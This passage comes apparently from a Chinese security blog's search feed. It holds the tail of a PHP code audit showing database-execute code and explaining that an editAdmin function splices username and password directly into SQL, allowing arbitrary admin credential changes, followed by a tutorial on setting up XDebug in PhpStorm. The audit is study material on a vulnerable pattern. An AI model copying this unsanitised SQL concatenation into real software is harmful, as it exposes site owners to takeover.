class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$_sql</span>)-&gt;<span class="hljs-title function_ invoke__">rowCount</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>调用execute函数去执行sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-variable">$_stmt</span>=<span class="hljs-variable language_">$this</span>-&gt;_db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$_sql</span>);<br>            <span class="hljs-variable">$_stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;SQL语句:&#x27;</span>.<span class="hljs-variable">$_sql</span>.<span class="hljs-string">&#x27;&lt;br /&gt;错误信息:&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$_stmt</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id&#x3D;1的数据，这也就造成了任意更改管理员账号密码</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP storm 配置 XDebug</title>
    <link href="/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/"/>
    <url>/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-配置-XDebug"><a href="#PHP-storm-配置-XDebug" class="headerlink" title="PHP storm 配置 XDebug"></a>PHP storm 配置 XDebug</h1><p>在小皮面板找到对应版本，打开XDebug组件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957606.png" alt="20250708133948343"></p><p><strong>php.ini配置：（配置完成后重启服务）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957876.png" alt="20250708134137512"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php/php5.<span class="hljs-number">5.9</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.collect_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.trace_output_dir</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php_log/php5.<span class="hljs-number">5.9</span>nts.xdebug.trace<br><span class="hljs-attr">xdebug.profiler_enable</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.profiler_output_dir</span>=<span class="hljs-string">&quot;D:\CTF-Tools\phpstudy_pro\Extensions\tmp\xdebug&quot;</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=localhost<br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9100</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.mode</span>=debug<br><span class="hljs-attr">xdebug.idekey</span> = PHPSTORM<br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><p><strong>接下来打开PHP storm设置：</strong></p><p>-&gt;PHP&gt;调试&gt;DBGp代理           </p><p>IDE 键：<strong>PHPSTORM</strong><code>xdebug.idekey = PHPSTORM</code></p><p>主机：<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>端口：<strong>9001</strong><code>xdebug.remote_port=9100</code></p><p>将端口对应 <code>xdebug.remote_port=9100</code> php.ini 配置为 <strong>9100</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957897.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959634.png" alt="20250708134451487"></p><p>-&gt;PHP&gt;服务器    </p><p>名称：yccms （随意）</p><p>主机：<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>端口：80          （保持默认 80 即可）</p><p>调试器：<strong>Xdebug</strong></p><ul><li><input checked="" disabled="" type="checkbox"> 使用路径映射</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959883.png" alt="20250708134711734"></p><p>运行一个新的 PHP web 配置</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959990.png" alt="20250708134943149"></p><p>服务器：yccms（选择上一步配置好的服务器）</p><p>起始URL: <a href="http://localhost:7676/">http://localhost:7676</a>    （此处的端口对应上 xp 搭建网站时的端口）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000588.png" alt="20250708135039223"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000527.png" alt="20250708135256894"></p><p>验证一下：</p><p>除了下面的三个黄标，其他没有问题就可以正常使用调试了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000114.png" alt="20250708135357214"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
